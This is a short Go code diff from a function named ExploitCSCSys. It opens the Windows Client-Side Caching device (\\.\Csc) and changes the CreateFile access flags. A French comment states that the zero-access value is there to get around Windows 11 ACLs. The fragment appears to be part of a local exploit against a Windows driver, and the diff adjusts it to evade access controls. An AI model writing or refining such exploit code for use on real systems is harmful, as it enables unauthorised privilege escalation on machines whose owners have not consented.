@@ -149,8 +149,8 @@ func ExploitCSCSys() bool {
 	devName, _ := syscall.UTF16PtrFromString("\\\\.\\Csc")
 	hDevice, _, _ := procCreateFile.Call(
 		uintptr(unsafe.Pointer(devName)),
-		syscall.GENERIC_READ|syscall.GENERIC_WRITE,
-		syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE,
+		0, // Accès minimal (0) pour contourner les ACLs de Windows 11
+		syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE|syscall.FILE_SHARE_DELETE,
 		0,
 		syscall.OPEN_EXISTING,
 		0,
